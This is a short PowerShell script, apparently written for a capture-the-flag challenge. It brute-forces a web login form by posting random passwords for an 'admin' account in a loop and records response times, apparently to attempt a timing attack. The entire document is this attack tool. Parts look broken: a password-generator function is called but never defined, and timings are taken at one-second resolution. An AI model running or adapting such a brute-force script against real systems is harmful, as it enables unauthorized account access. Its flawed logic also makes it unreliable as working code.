$charset = @"
']$`"%!&'*(),-+/.01235647:8<9=;>?@ABCDEFGHIJKLMNOPQSTUVRWXY[Z\^_abcdefghjiklmnoqrstpuvxwy{|}~z#
"@
$1c = [array]$charset -split ''
$uri = 'http://bbbcrypt.runcode.ninja/login'
$contentType = 'application/x-www-form-urlencoded'
$encoding = 'iso-8859-1'  
$UserAgent = 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0'
# $r = Invoke-RestMethod -Method Post -SessionVariable $s -Uri $uri -Body $body -ContentType $contentType -UserAgent $UserAgent
# Date           Tue, 02 Oct 2018 01:58:48 GMT
$now = [datetime]::UtcNow.ToFileTimeUtc() | Get-date -UFormat '%a, %d %b 20%y %T GMT'
$timings = @()
$log = @()
$tryPass = $null
function brute
{
    do
    {
        $c = (New-RandomPassword(7)).PTPass
        $body = 'username=admin&password=' + $c
        $StartTime = [datetime]::UtcNow.ToFileTimeUtc() | Get-date -UFormat '%a, %d %b 20%y %T GMT'
        $iwr = Invoke-WebRequest -Uri $uri -UserAgent $UserAgent -ContentType $contentType -Method POST -DisableKeepAlive -Body $body
        $StopTime = [datetime]::UtcNow.ToFileTimeUtc() | Get-date -UFormat '%a, %d %b 20%y %T GMT'
        $dif = New-TimeSpan -Start $StartTime -End $StopTime
        $timings+=@{$c=$dif.TotalMilliseconds}
        $log+=$iwr
        $tryPass+=$c
        Write-Host $c $dif.TotalMilliseconds
    }
    while (!($iwr.Content.Contains("alert")))
}
brute